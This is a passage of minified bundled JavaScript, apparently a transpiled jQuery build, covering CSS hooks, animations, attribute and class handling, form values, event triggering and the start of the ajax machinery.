                    (r += (o && o[3]) || (de.cssNumber[l] ? "" : "px")),
                  oe.clearCloneStyle ||
                    "" !== r ||
                    0 !== t.indexOf("background") ||
                    (u[t] = "inherit"),
                  (a && "set" in a && void 0 === (r = a.set(e, r, i))) ||
                    (c ? u.setProperty(t, r) : (u[t] = r)));
            }
          },
          css: function (e, t, n, r) {
            var i,
              o,
              s,
              a = f(t);
            return (
              nt.test(t) || (t = q(a)),
              (s = de.cssHooks[t] || de.cssHooks[a]) &&
                "get" in s &&
                (i = s.get(e, !0, n)),
              void 0 === i && (i = j(e, t, r)),
              "normal" === i && t in ft && (i = ft[t]),
              "" === n || n
                ? ((o = parseFloat(i)), !0 === n || isFinite(o) ? o || 0 : i)
                : i
            );
          },
        }),
          de.each(["height", "width"], function (e, t) {
            de.cssHooks[t] = {
              get: function (e, n, r) {
                if (n)
                  return !dt.test(de.css(e, "display")) ||
                    (e.getClientRects().length &&
                      e.getBoundingClientRect().width)
                    ? P(e, t, r)
                    : it(e, pt, function () {
                        return P(e, t, r);
                      });
              },
              set: function (e, n, r) {
                var i,
                  o = rt(e),
                  s = !oe.scrollboxSize() && "absolute" === o.position,
                  a =
                    (s || r) && "border-box" === de.css(e, "boxSizing", !1, o),
                  l = r ? H(e, t, r, a, o) : 0;
                return (
                  a &&
                    s &&
                    (l -= Math.ceil(
                      e["offset" + t[0].toUpperCase() + t.slice(1)] -
                        parseFloat(o[t]) -
                        H(e, t, "border", !1, o) -
                        0.5
                    )),
                  l &&
                    (i = Ne.exec(n)) &&
                    "px" !== (i[3] || "px") &&
                    ((e.style[t] = n), (n = de.css(e, t))),
                  N(0, n, l)
                );
              },
            };
          }),
          (de.cssHooks.marginLeft = O(oe.reliableMarginLeft, function (e, t) {
            if (t)
              return (
                (parseFloat(j(e, "marginLeft")) ||
                  e.getBoundingClientRect().left -
                    it(e, { marginLeft: 0 }, function () {
                      return e.getBoundingClientRect().left;
                    })) + "px"
              );
          })),
          de.each(
            { margin: "", padding: "", border: "Width" },
            function (e, t) {
              (de.cssHooks[e + t] = {
                expand: function (n) {
                  for (
                    var r = 0,
                      i = {},
                      o = "string" == typeof n ? n.split(" ") : [n];
                    r < 4;
                    r++
                  )
                    i[e + He[r] + t] = o[r] || o[r - 2] || o[0];
                  return i;
                },
              }),
                "margin" !== e && (de.cssHooks[e + t].set = N);
            }
          ),
          de.fn.extend({
            css: function (e, t) {
              return Ce(
                this,
                function (e, t, n) {
                  var r,
                    i,
                    o = {},
                    s = 0;
                  if (Array.isArray(t)) {
                    for (r = rt(e), i = t.length; s < i; s++)
                      o[t[s]] = de.css(e, t[s], !1, r);
                    return o;
                  }
                  return void 0 !== n ? de.style(e, t, n) : de.css(e, t);
                },
                e,
                t,
                arguments.length > 1
              );
            },
          }),
          (de.Tween = ht),
          (ht.prototype = {
            constructor: ht,
            init: function (e, t, n, r, i, o) {
              (this.elem = e),
                (this.prop = n),
                (this.easing = i || de.easing._default),
                (this.options = t),
                (this.start = this.now = this.cur()),
                (this.end = r),
                (this.unit = o || (de.cssNumber[n] ? "" : "px"));
            },
            cur: function () {
              var e = ht.propHooks[this.prop];
              return e && e.get ? e.get(this) : ht.propHooks._default.get(this);
            },
            run: function (e) {
              var t,
                n = ht.propHooks[this.prop];
              return (
                this.options.duration
                  ? (this.pos = t =
                      de.easing[this.easing](
                        e,
                        this.options.duration * e,
                        0,
                        1,
                        this.options.duration
                      ))
                  : (this.pos = t = e),
                (this.now = (this.end - this.start) * t + this.start),
                this.options.step &&
                  this.options.step.call(this.elem, this.now, this),
                n && n.set ? n.set(this) : ht.propHooks._default.set(this),
                this
              );
            },
          }),
          (ht.prototype.init.prototype = ht.prototype),
          (ht.propHooks = {
            _default: {
              get: function (e) {
                var t;
                return 1 !== e.elem.nodeType ||
                  (null != e.elem[e.prop] && null == e.elem.style[e.prop])
                  ? e.elem[e.prop]
                  : (t = de.css(e.elem, e.prop, "")) && "auto" !== t
                  ? t
                  : 0;
              },
              set: function (e) {
                de.fx.step[e.prop]
                  ? de.fx.step[e.prop](e)
                  : 1 !== e.elem.nodeType ||
                    (!de.cssHooks[e.prop] && null == e.elem.style[q(e.prop)])
                  ? (e.elem[e.prop] = e.now)
                  : de.style(e.elem, e.prop, e.now + e.unit);
              },
            },
          }),
          (ht.propHooks.scrollTop = ht.propHooks.scrollLeft =
            {
              set: function (e) {
                e.elem.nodeType &&
                  e.elem.parentNode &&
                  (e.elem[e.prop] = e.now);
              },
            }),
          (de.easing = {
            linear: function (e) {
              return e;
            },
            swing: function (e) {
              return 0.5 - Math.cos(e * Math.PI) / 2;
            },
            _default: "swing",
          }),
          (de.fx = ht.prototype.init),
          (de.fx.step = {});
        var gt,
          mt,
          vt = /^(?:toggle|show|hide)$/,
          yt = /queueHooks$/;
        function bt() {
          mt &&
            (!1 === le.hidden && e.requestAnimationFrame
              ? e.requestAnimationFrame(bt)
              : e.setTimeout(bt, de.fx.interval),
            de.fx.tick());
        }
        function xt(e, t, n) {
          var r,
            i,
            o = 0,
            s = xt.prefilters.length,
            a = de.Deferred().always(function () {
              delete l.elem;
            }),
            l = function () {
              if (i) return !1;
              for (
                var t = gt || I(),
                  n = Math.max(0, c.startTime + c.duration - t),
                  r = 1 - (n / c.duration || 0),
                  o = 0,
                  s = c.tweens.length;
                o < s;
                o++
              )
                c.tweens[o].run(r);
              return (
                a.notifyWith(e, [c, r, n]),
                r < 1 && s
                  ? n
                  : (s || a.notifyWith(e, [c, 1, 0]), a.resolveWith(e, [c]), !1)
              );
            },
            c = a.promise({
              elem: e,
              props: de.extend({}, t),
              opts: de.extend(
                !0,
                { specialEasing: {}, easing: de.easing._default },
                n
              ),
              originalProperties: t,
              originalOptions: n,
              startTime: gt || I(),
              duration: n.duration,
              tweens: [],
              createTween: function (t, n) {
                var r = de.Tween(
                  e,
                  c.opts,
                  t,
                  n,
                  c.opts.specialEasing[t] || c.opts.easing
                );
                return c.tweens.push(r), r;
              },
              stop: function (t) {
                var n = 0,
                  r = t ? c.tweens.length : 0;
                if (i) return this;
                for (i = !0; n < r; n++) c.tweens[n].run(1);
                return (
                  t
                    ? (a.notifyWith(e, [c, 1, 0]), a.resolveWith(e, [c, t]))
                    : a.rejectWith(e, [c, t]),
                  this
                );
              },
            }),
            u = c.props;
          for (U(u, c.opts.specialEasing); o < s; o++)
            if ((r = xt.prefilters[o].call(c, e, u, c.opts)))
              return (
                se(r.stop) &&
                  (de._queueHooks(c.elem, c.opts.queue).stop = r.stop.bind(r)),
                r
              );
          return (
            de.map(u, M, c),
            se(c.opts.start) && c.opts.start.call(e, c),
            c
              .progress(c.opts.progress)
              .done(c.opts.done, c.opts.complete)
              .fail(c.opts.fail)
              .always(c.opts.always),
            de.fx.timer(
              de.extend(l, { elem: e, anim: c, queue: c.opts.queue })
            ),
            c
          );
        }
        (de.Animation = de.extend(xt, {
          tweeners: {
            "*": [
              function (e, t) {
                var n = this.createTween(e, t);
                return g(n.elem, e, Ne.exec(t), n), n;
              },
            ],
          },
          tweener: function (e, t) {
            se(e) ? ((t = e), (e = ["*"])) : (e = e.match(we));
            for (var n, r = 0, i = e.length; r < i; r++)
              (n = e[r]),
                (xt.tweeners[n] = xt.tweeners[n] || []),
                xt.tweeners[n].unshift(t);
          },
          prefilters: [
            function (e, t, n) {
              var r,
                i,
                o,
                s,
                a,
                l,
                c,
                u,
                d = "width" in t || "height" in t,
                p = this,
                f = {},
                h = e.style,
                g = e.nodeType && Me(e),
                m = ke.get(e, "fxshow");
              for (r in (n.queue ||
                (null == (s = de._queueHooks(e, "fx")).unqueued &&
                  ((s.unqueued = 0),
                  (a = s.empty.fire),
                  (s.empty.fire = function () {
                    s.unqueued || a();
                  })),
                s.unqueued++,
                p.always(function () {
                  p.always(function () {
                    s.unqueued--, de.queue(e, "fx").length || s.empty.fire();
                  });
                })),
              t))
                if (((i = t[r]), vt.test(i))) {
                  if (
                    (delete t[r],
                    (o = o || "toggle" === i),
                    i === (g ? "hide" : "show"))
                  ) {
                    if ("show" !== i || !m || void 0 === m[r]) continue;
                    g = !0;
                  }
                  f[r] = (m && m[r]) || de.style(e, r);
                }
              if ((l = !de.isEmptyObject(t)) || !de.isEmptyObject(f))
                for (r in (d &&
                  1 === e.nodeType &&
                  ((n.overflow = [h.overflow, h.overflowX, h.overflowY]),
                  null == (c = m && m.display) && (c = ke.get(e, "display")),
                  "none" === (u = de.css(e, "display")) &&
                    (c
                      ? (u = c)
                      : (v([e], !0),
                        (c = e.style.display || c),
                        (u = de.css(e, "display")),
                        v([e]))),
                  ("inline" === u || ("inline-block" === u && null != c)) &&
                    "none" === de.css(e, "float") &&
                    (l ||
                      (p.done(function () {
                        h.display = c;
                      }),
                      null == c &&
                        ((u = h.display), (c = "none" === u ? "" : u))),
                    (h.display = "inline-block"))),
                n.overflow &&
                  ((h.overflow = "hidden"),
                  p.always(function () {
                    (h.overflow = n.overflow[0]),
                      (h.overflowX = n.overflow[1]),
                      (h.overflowY = n.overflow[2]);
                  })),
                (l = !1),
                f))
                  l ||
                    (m
                      ? "hidden" in m && (g = m.hidden)
                      : (m = ke.access(e, "fxshow", { display: c })),
                    o && (m.hidden = !g),
                    g && v([e], !0),
                    p.done(function () {
                      for (r in (g || v([e]), ke.remove(e, "fxshow"), f))
                        de.style(e, r, f[r]);
                    })),
                    (l = M(g ? m[r] : 0, r, p)),
                    r in m ||
                      ((m[r] = l.start),
                      g && ((l.end = l.start), (l.start = 0)));
            },
          ],
          prefilter: function (e, t) {
            t ? xt.prefilters.unshift(e) : xt.prefilters.push(e);
          },
        })),
          (de.speed = function (e, t, n) {
            var r =
              e && "object" == typeof e
                ? de.extend({}, e)
                : {
                    complete: n || (!n && t) || (se(e) && e),
                    duration: e,
                    easing: (n && t) || (t && !se(t) && t),
                  };
            return (
              de.fx.off
                ? (r.duration = 0)
                : "number" != typeof r.duration &&
                  (r.duration in de.fx.speeds
                    ? (r.duration = de.fx.speeds[r.duration])
                    : (r.duration = de.fx.speeds._default)),
              (null != r.queue && !0 !== r.queue) || (r.queue = "fx"),
              (r.old = r.complete),
              (r.complete = function () {
                se(r.old) && r.old.call(this),
                  r.queue && de.dequeue(this, r.queue);
              }),
              r
            );
          }),
          de.fn.extend({
            fadeTo: function (e, t, n, r) {
              return this.filter(Me)
                .css("opacity", 0)
                .show()
                .end()
                .animate({ opacity: t }, e, n, r);
            },
            animate: function (e, t, n, r) {
              var i = de.isEmptyObject(e),
                o = de.speed(t, n, r),
                s = function () {
                  var t = xt(this, de.extend({}, e), o);
                  (i || ke.get(this, "finish")) && t.stop(!0);
                };
              return (
                (s.finish = s),
                i || !1 === o.queue ? this.each(s) : this.queue(o.queue, s)
              );
            },
            stop: function (e, t, n) {
              var r = function (e) {
                var t = e.stop;
                delete e.stop, t(n);
              };
              return (
                "string" != typeof e && ((n = t), (t = e), (e = void 0)),
                t && this.queue(e || "fx", []),
                this.each(function () {
                  var t = !0,
                    i = null != e && e + "queueHooks",
                    o = de.timers,
                    s = ke.get(this);
                  if (i) s[i] && s[i].stop && r(s[i]);
                  else for (i in s) s[i] && s[i].stop && yt.test(i) && r(s[i]);
                  for (i = o.length; i--; )
                    o[i].elem !== this ||
                      (null != e && o[i].queue !== e) ||
                      (o[i].anim.stop(n), (t = !1), o.splice(i, 1));
                  (!t && n) || de.dequeue(this, e);
                })
              );
            },
            finish: function (e) {
              return (
                !1 !== e && (e = e || "fx"),
                this.each(function () {
                  var t,
                    n = ke.get(this),
                    r = n[e + "queue"],
                    i = n[e + "queueHooks"],
                    o = de.timers,
                    s = r ? r.length : 0;
                  for (
                    n.finish = !0,
                      de.queue(this, e, []),
                      i && i.stop && i.stop.call(this, !0),
                      t = o.length;
                    t--;

                  )
                    o[t].elem === this &&
                      o[t].queue === e &&
                      (o[t].anim.stop(!0), o.splice(t, 1));
                  for (t = 0; t < s; t++)
                    r[t] && r[t].finish && r[t].finish.call(this);
                  delete n.finish;
                })
              );
            },
          }),
          de.each(["toggle", "show", "hide"], function (e, t) {
            var n = de.fn[t];
            de.fn[t] = function (e, r, i) {
              return null == e || "boolean" == typeof e
                ? n.apply(this, arguments)
                : this.animate(R(t, !0), e, r, i);
            };
          }),
          de.each(
            {
              slideDown: R("show"),
              slideUp: R("hide"),
              slideToggle: R("toggle"),
              fadeIn: { opacity: "show" },
              fadeOut: { opacity: "hide" },
              fadeToggle: { opacity: "toggle" },
            },
            function (e, t) {
              de.fn[e] = function (e, n, r) {
                return this.animate(t, e, n, r);
              };
            }
          ),
          (de.timers = []),
          (de.fx.tick = function () {
            var e,
              t = 0,
              n = de.timers;
            for (gt = Date.now(); t < n.length; t++)
              (e = n[t])() || n[t] !== e || n.splice(t--, 1);
            n.length || de.fx.stop(), (gt = void 0);
          }),
          (de.fx.timer = function (e) {
            de.timers.push(e), de.fx.start();
          }),
          (de.fx.interval = 13),
          (de.fx.start = function () {
            mt || ((mt = !0), bt());
          }),
          (de.fx.stop = function () {
            mt = null;
          }),
          (de.fx.speeds = { slow: 600, fast: 200, _default: 400 }),
          (de.fn.delay = function (t, n) {
            return (
              (t = (de.fx && de.fx.speeds[t]) || t),
              (n = n || "fx"),
              this.queue(n, function (n, r) {
                var i = e.setTimeout(n, t);
                r.stop = function () {
                  e.clearTimeout(i);
                };
              })
            );
          }),
          (function () {
            var e = le.createElement("input"),
              t = le
                .createElement("select")
                .appendChild(le.createElement("option"));
            (e.type = "checkbox"),
              (oe.checkOn = "" !== e.value),
              (oe.optSelected = t.selected),
              ((e = le.createElement("input")).value = "t"),
              (e.type = "radio"),
              (oe.radioValue = "t" === e.value);
          })();
        var wt,
          _t = de.expr.attrHandle;
        de.fn.extend({
          attr: function (e, t) {
            return Ce(this, de.attr, e, t, arguments.length > 1);
          },
          removeAttr: function (e) {
            return this.each(function () {
              de.removeAttr(this, e);
            });
          },
        }),
          de.extend({
            attr: function (e, t, n) {
              var r,
                i,
                o = e.nodeType;
              if (3 !== o && 8 !== o && 2 !== o)
                return void 0 === e.getAttribute
                  ? de.prop(e, t, n)
                  : ((1 === o && de.isXMLDoc(e)) ||
                      (i =
                        de.attrHooks[t.toLowerCase()] ||
                        (de.expr.match.bool.test(t) ? wt : void 0)),
                    void 0 !== n
                      ? null === n
                        ? void de.removeAttr(e, t)
                        : i && "set" in i && void 0 !== (r = i.set(e, n, t))
                        ? r
                        : (e.setAttribute(t, n + ""), n)
                      : i && "get" in i && null !== (r = i.get(e, t))
                      ? r
                      : null == (r = de.find.attr(e, t))
                      ? void 0
                      : r);
            },
            attrHooks: {
              type: {
                set: function (e, t) {
                  if (!oe.radioValue && "radio" === t && s(e, "input")) {
                    var n = e.value;
                    return e.setAttribute("type", t), n && (e.value = n), t;
                  }
                },
              },
            },
            removeAttr: function (e, t) {
              var n,
                r = 0,
                i = t && t.match(we);
              if (i && 1 === e.nodeType)
                for (; (n = i[r++]); ) e.removeAttribute(n);
            },
          }),
          (wt = {
            set: function (e, t, n) {
              return !1 === t ? de.removeAttr(e, n) : e.setAttribute(n, n), n;
            },
          }),
          de.each(de.expr.match.bool.source.match(/\w+/g), function (e, t) {
            var n = _t[t] || de.find.attr;
            _t[t] = function (e, t, r) {
              var i,
                o,
                s = t.toLowerCase();
              return (
                r ||
                  ((o = _t[s]),
                  (_t[s] = i),
                  (i = null != n(e, t, r) ? s : null),
                  (_t[s] = o)),
                i
              );
            };
          });
        var Tt = /^(?:input|select|textarea|button)$/i,
          At = /^(?:a|area)$/i;
        de.fn.extend({
          prop: function (e, t) {
            return Ce(this, de.prop, e, t, arguments.length > 1);
          },
          removeProp: function (e) {
            return this.each(function () {
              delete this[de.propFix[e] || e];
            });
          },
        }),
          de.extend({
            prop: function (e, t, n) {
              var r,
                i,
                o = e.nodeType;
              if (3 !== o && 8 !== o && 2 !== o)
                return (
                  (1 === o && de.isXMLDoc(e)) ||
                    ((t = de.propFix[t] || t), (i = de.propHooks[t])),
                  void 0 !== n
                    ? i && "set" in i && void 0 !== (r = i.set(e, n, t))
                      ? r
                      : (e[t] = n)
                    : i && "get" in i && null !== (r = i.get(e, t))
                    ? r
                    : e[t]
                );
            },
            propHooks: {
              tabIndex: {
                get: function (e) {
                  var t = de.find.attr(e, "tabindex");
                  return t
                    ? parseInt(t, 10)
                    : Tt.test(e.nodeName) || (At.test(e.nodeName) && e.href)
                    ? 0
                    : -1;
                },
              },
            },
            propFix: { for: "htmlFor", class: "className" },
          }),
          oe.optSelected ||
            (de.propHooks.selected = {
              get: function (e) {
                var t = e.parentNode;
                return t && t.parentNode && t.parentNode.selectedIndex, null;
              },
              set: function (e) {
                var t = e.parentNode;
                t &&
                  (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex);
              },
            }),
          de.each(
            [
              "tabIndex",
              "readOnly",
              "maxLength",
              "cellSpacing",
              "cellPadding",
              "rowSpan",
              "colSpan",
              "useMap",
              "frameBorder",
              "contentEditable",
            ],
            function () {
              de.propFix[this.toLowerCase()] = this;
            }
          ),
          de.fn.extend({
            addClass: function (e) {
              var t, n, r, i, o, s;
              return se(e)
                ? this.each(function (t) {
                    de(this).addClass(e.call(this, t, W(this)));
                  })
                : (t = z(e)).length
                ? this.each(function () {
                    if (
                      ((r = W(this)),
                      (n = 1 === this.nodeType && " " + F(r) + " "))
                    ) {
                      for (o = 0; o < t.length; o++)
                        (i = t[o]),
                          n.indexOf(" " + i + " ") < 0 && (n += i + " ");
                      (s = F(n)), r !== s && this.setAttribute("class", s);
                    }
                  })
                : this;
            },
            removeClass: function (e) {
              var t, n, r, i, o, s;
              return se(e)
                ? this.each(function (t) {
                    de(this).removeClass(e.call(this, t, W(this)));
                  })
                : arguments.length
                ? (t = z(e)).length
                  ? this.each(function () {
                      if (
                        ((r = W(this)),
                        (n = 1 === this.nodeType && " " + F(r) + " "))
                      ) {
                        for (o = 0; o < t.length; o++)
                          for (i = t[o]; n.indexOf(" " + i + " ") > -1; )
                            n = n.replace(" " + i + " ", " ");
                        (s = F(n)), r !== s && this.setAttribute("class", s);
                      }
                    })
                  : this
                : this.attr("class", "");
            },
            toggleClass: function (e, t) {
              var r,
                i,
                o,
                s,
                a = void 0 === e ? "undefined" : (0, n.default)(e),
                l = "string" === a || Array.isArray(e);
              return se(e)
                ? this.each(function (n) {
                    de(this).toggleClass(e.call(this, n, W(this), t), t);
                  })
                : "boolean" == typeof t && l
                ? t
                  ? this.addClass(e)
                  : this.removeClass(e)
                : ((r = z(e)),
                  this.each(function () {
                    if (l)
                      for (s = de(this), o = 0; o < r.length; o++)
                        (i = r[o]),
                          s.hasClass(i) ? s.removeClass(i) : s.addClass(i);
                    else
                      (void 0 !== e && "boolean" !== a) ||
                        ((i = W(this)) && ke.set(this, "__className__", i),
                        this.setAttribute &&
                          this.setAttribute(
                            "class",
                            i || !1 === e
                              ? ""
                              : ke.get(this, "__className__") || ""
                          ));
                  }));
            },
            hasClass: function (e) {
              var t,
                n,
                r = 0;
              for (t = " " + e + " "; (n = this[r++]); )
                if (1 === n.nodeType && (" " + F(W(n)) + " ").indexOf(t) > -1)
                  return !0;
              return !1;
            },
          });
        var Ct = /\r/g;
        de.fn.extend({
          val: function (e) {
            var t,
              n,
              r,
              i = this[0];
            return arguments.length
              ? ((r = se(e)),
                this.each(function (n) {
                  var i;
                  1 === this.nodeType &&
                    (null == (i = r ? e.call(this, n, de(this).val()) : e)
                      ? (i = "")
                      : "number" == typeof i
                      ? (i += "")
                      : Array.isArray(i) &&
                        (i = de.map(i, function (e) {
                          return null == e ? "" : e + "";
                        })),
                    ((t =
                      de.valHooks[this.type] ||
                      de.valHooks[this.nodeName.toLowerCase()]) &&
                      "set" in t &&
                      void 0 !== t.set(this, i, "value")) ||
                      (this.value = i));
                }))
              : i
              ? (t =
                  de.valHooks[i.type] ||
                  de.valHooks[i.nodeName.toLowerCase()]) &&
                "get" in t &&
                void 0 !== (n = t.get(i, "value"))
                ? n
                : "string" == typeof (n = i.value)
                ? n.replace(Ct, "")
                : null == n
                ? ""
                : n
              : void 0;
          },
        }),
          de.extend({
            valHooks: {
              option: {
                get: function (e) {
                  var t = de.find.attr(e, "value");
                  return null != t ? t : F(de.text(e));
                },
              },
              select: {
                get: function (e) {
                  var t,
                    n,
                    r,
                    i = e.options,
                    o = e.selectedIndex,
                    a = "select-one" === e.type,
                    l = a ? null : [],
                    c = a ? o + 1 : i.length;
                  for (r = o < 0 ? c : a ? o : 0; r < c; r++)
                    if (
                      ((n = i[r]).selected || r === o) &&
                      !n.disabled &&
                      (!n.parentNode.disabled || !s(n.parentNode, "optgroup"))
                    ) {
                      if (((t = de(n).val()), a)) return t;
                      l.push(t);
                    }
                  return l;
                },
                set: function (e, t) {
                  for (
                    var n, r, i = e.options, o = de.makeArray(t), s = i.length;
                    s--;

                  )
                    ((r = i[s]).selected =
                      de.inArray(de.valHooks.option.get(r), o) > -1) &&
                      (n = !0);
                  return n || (e.selectedIndex = -1), o;
                },
              },
            },
          }),
          de.each(["radio", "checkbox"], function () {
            (de.valHooks[this] = {
              set: function (e, t) {
                if (Array.isArray(t))
                  return (e.checked = de.inArray(de(e).val(), t) > -1);
              },
            }),
              oe.checkOn ||
                (de.valHooks[this].get = function (e) {
                  return null === e.getAttribute("value") ? "on" : e.value;
                });
          }),
          (oe.focusin = "onfocusin" in e);
        var $t = /^(?:focusinfocus|focusoutblur)$/,
          St = function (e) {
            e.stopPropagation();
          };
        de.extend(de.event, {
          trigger: function (t, n, r, i) {
            var o,
              s,
              a,
              l,
              c,
              u,
              d,
              p,
              f = [r || le],
              h = ne.call(t, "type") ? t.type : t,
              g = ne.call(t, "namespace") ? t.namespace.split(".") : [];
            if (
              ((s = p = a = r = r || le),
              3 !== r.nodeType &&
                8 !== r.nodeType &&
                !$t.test(h + de.event.triggered) &&
                (h.indexOf(".") > -1 &&
                  ((g = h.split(".")), (h = g.shift()), g.sort()),
                (c = h.indexOf(":") < 0 && "on" + h),
                ((t = t[de.expando]
                  ? t
                  : new de.Event(h, "object" == typeof t && t)).isTrigger = i
                  ? 2
                  : 3),
                (t.namespace = g.join(".")),
                (t.rnamespace = t.namespace
                  ? new RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)")
                  : null),
                (t.result = void 0),
                t.target || (t.target = r),
                (n = null == n ? [t] : de.makeArray(n, [t])),
                (d = de.event.special[h] || {}),
                i || !d.trigger || !1 !== d.trigger.apply(r, n)))
            ) {
              if (!i && !d.noBubble && !ae(r)) {
                for (
                  l = d.delegateType || h, $t.test(l + h) || (s = s.parentNode);
                  s;
                  s = s.parentNode
                )
                  f.push(s), (a = s);
                a === (r.ownerDocument || le) &&
                  f.push(a.defaultView || a.parentWindow || e);
              }
              for (o = 0; (s = f[o++]) && !t.isPropagationStopped(); )
                (p = s),
                  (t.type = o > 1 ? l : d.bindType || h),
                  (u =
                    (ke.get(s, "events") || Object.create(null))[t.type] &&
                    ke.get(s, "handle")) && u.apply(s, n),
                  (u = c && s[c]) &&
                    u.apply &&
                    Ee(s) &&
                    ((t.result = u.apply(s, n)),
                    !1 === t.result && t.preventDefault());
              return (
                (t.type = h),
                i ||
                  t.isDefaultPrevented() ||
                  (d._default && !1 !== d._default.apply(f.pop(), n)) ||
                  !Ee(r) ||
                  (c &&
                    se(r[h]) &&
                    !ae(r) &&
                    ((a = r[c]) && (r[c] = null),
                    (de.event.triggered = h),
                    t.isPropagationStopped() && p.addEventListener(h, St),
                    r[h](),
                    t.isPropagationStopped() && p.removeEventListener(h, St),
                    (de.event.triggered = void 0),
                    a && (r[c] = a))),
                t.result
              );
            }
          },
          simulate: function (e, t, n) {
            var r = de.extend(new de.Event(), n, { type: e, isSimulated: !0 });
            de.event.trigger(r, null, t);
          },
        }),
          de.fn.extend({
            trigger: function (e, t) {
              return this.each(function () {
                de.event.trigger(e, t, this);
              });
            },
            triggerHandler: function (e, t) {
              var n = this[0];
              if (n) return de.event.trigger(e, t, n, !0);
            },
          }),
          oe.focusin ||
            de.each({ focus: "focusin", blur: "focusout" }, function (e, t) {
              var n = function (e) {
                de.event.simulate(t, e.target, de.event.fix(e));
              };
              de.event.special[t] = {
                setup: function () {
                  var r = this.ownerDocument || this.document || this,
                    i = ke.access(r, t);
                  i || r.addEventListener(e, n, !0),
                    ke.access(r, t, (i || 0) + 1);
                },
                teardown: function () {
                  var r = this.ownerDocument || this.document || this,
                    i = ke.access(r, t) - 1;
                  i
                    ? ke.access(r, t, i)
                    : (r.removeEventListener(e, n, !0), ke.remove(r, t));
                },
              };
            });
        var Et = e.location,
          Dt = { guid: Date.now() },
          kt = /\?/;
        de.parseXML = function (t) {
          var n, r;
          if (!t || "string" != typeof t) return null;
          try {
            n = new e.DOMParser().parseFromString(t, "text/xml");
          } catch (e) {}
          return (
            (r = n && n.getElementsByTagName("parsererror")[0]),
            (n && !r) ||
              de.error(
                "Invalid XML: " +
                  (r
                    ? de
                        .map(r.childNodes, function (e) {
                          return e.textContent;
                        })
                        .join("\n")
                    : t)
              ),
            n
          );
        };
        var Lt = /\[\]$/,
          jt = /\r?\n/g,
          Ot = /^(?:submit|button|image|reset|file)$/i,
          qt = /^(?:input|select|textarea|keygen)/i;
        function Nt(e, t, n, r) {
          var o;
          if (Array.isArray(t))
            de.each(t, function (t, i) {
              n || Lt.test(e)
                ? r(e, i)
                : Nt(
                    e +
                      "[" +
                      ("object" == typeof i && null != i ? t : "") +
                      "]",
                    i,
                    n,
                    r
                  );
            });
          else if (n || "object" !== i(t)) r(e, t);
          else for (o in t) Nt(e + "[" + o + "]", t[o], n, r);
        }
        (de.param = function (e, t) {
          var n,
            r = [],
            i = function (e, t) {
              var n = se(t) ? t() : t;
              r[r.length] =
                encodeURIComponent(e) +
                "=" +
                encodeURIComponent(null == n ? "" : n);
            };
          if (null == e) return "";
          if (Array.isArray(e) || (e.jquery && !de.isPlainObject(e)))
            de.each(e, function () {
              i(this.name, this.value);
            });
          else for (n in e) Nt(n, e[n], t, i);
          return r.join("&");
        }),
          de.fn.extend({
            serialize: function () {
              return de.param(this.serializeArray());
            },
            serializeArray: function () {
              return this.map(function () {
                var e = de.prop(this, "elements");
                return e ? de.makeArray(e) : this;
              })
                .filter(function () {
                  var e = this.type;
                  return (
                    this.name &&
                    !de(this).is(":disabled") &&
                    qt.test(this.nodeName) &&
                    !Ot.test(e) &&
                    (this.checked || !ze.test(e))
                  );
                })
                .map(function (e, t) {
                  var n = de(this).val();
                  return null == n
                    ? null
                    : Array.isArray(n)
                    ? de.map(n, function (e) {
                        return { name: t.name, value: e.replace(jt, "\r\n") };
                      })
                    : { name: t.name, value: n.replace(jt, "\r\n") };
                })
                .get();
            },
          });
        var Ht = /%20/g,
          Pt = /#.*$/,
          It = /([?&])_=[^&]*/,
          Rt = /^(.*?):[ \t]*([^\r\n]*)$/gm,
          Mt = /^(?:GET|HEAD)$/,
          Ut = /^\/\//,
          Ft = {},
          Wt = {},
          zt = "*/".concat("*"),
          Bt = le.createElement("a");
        (Bt.href = Et.href),
          de.extend({
            active: 0,
            lastModified: {},
            etag: {},
            ajaxSettings: {
              url: Et.href,
              type: "GET",
              isLocal:
                /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(
                  Et.protocol
                ),
              global: !0,
              processData: !0,
              async: !0,
              contentType: "application/x-www-form-urlencoded; charset=UTF-8",
              accepts: {
                "*": zt,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript",
              },
              contents: { xml: /\bxml\b/, html: /\bhtml/, json: /\bjson\b/ },
              responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON",
              },
              converters: {
                "* text": String,
                "text html": !0,
                "text json": JSON.parse,
                "text xml": de.parseXML,
              },
              flatOptions: { url: !0, context: !0 },
            },
            ajaxSetup: function (e, t) {
              return t ? Y(Y(e, de.ajaxSettings), t) : Y(de.ajaxSettings, e);
            },
            ajaxPrefilter: B(Ft),
            ajaxTransport: B(Wt),
            ajax: function (t, n) {
              var r = function (t, n, r, a) {
                var c,
                  p,
                  f,
                  x,
                  w,
                  _ = n;
                u ||
                  ((u = !0),
                  l && e.clearTimeout(l),
                  (i = void 0),
                  (s = a || ""),
                  (T.readyState = t > 0 ? 4 : 0),
                  (c = (t >= 200 && t < 300) || 304 === t),
                  r &&
                    (x = (function (e, t, n) {
                      for (
                        var r, i, o, s, a = e.contents, l = e.dataTypes;
                        "*" === l[0];

                      )
                        l.shift(),
                          void 0 === r &&
                            (r =
                              e.mimeType ||
                              t.getResponseHeader("Content-Type"));
                      if (r)
                        for (i in a)
                          if (a[i] && a[i].test(r)) {
                            l.unshift(i);
                            break;
                          }
                      if (l[0] in n) o = l[0];
                      else {
                        for (i in n) {
                          if (!l[0] || e.converters[i + " " + l[0]]) {
                            o = i;
                            break;
                          }
                          s || (s = i);
                        }
                        o = o || s;
                      }
                      if (o) return o !== l[0] && l.unshift(o), n[o];
                    })(h, T, r)),
                  !c &&
                    de.inArray("script", h.dataTypes) > -1 &&
                    de.inArray("json", h.dataTypes) < 0 &&
                    (h.converters["text script"] = function () {}),
                  (x = (function (e, t, n, r) {
                    var i,
                      o,
                      s,
                      a,
                      l,
                      c = {},
                      u = e.dataTypes.slice();
                    if (u[1])
                      for (s in e.converters)
                        c[s.toLowerCase()] = e.converters[s];
                    for (o = u.shift(); o; )
                      if (
                        (e.responseFields[o] && (n[e.responseFields[o]] = t),
                        !l &&
                          r &&
                          e.dataFilter &&
                          (t = e.dataFilter(t, e.dataType)),
                        (l = o),
                        (o = u.shift()))
                      )
                        if ("*" === o) o = l;
                        else if ("*" !== l && l !== o) {
                          if (!(s = c[l + " " + o] || c["* " + o]))
                            for (i in c)
                              if (
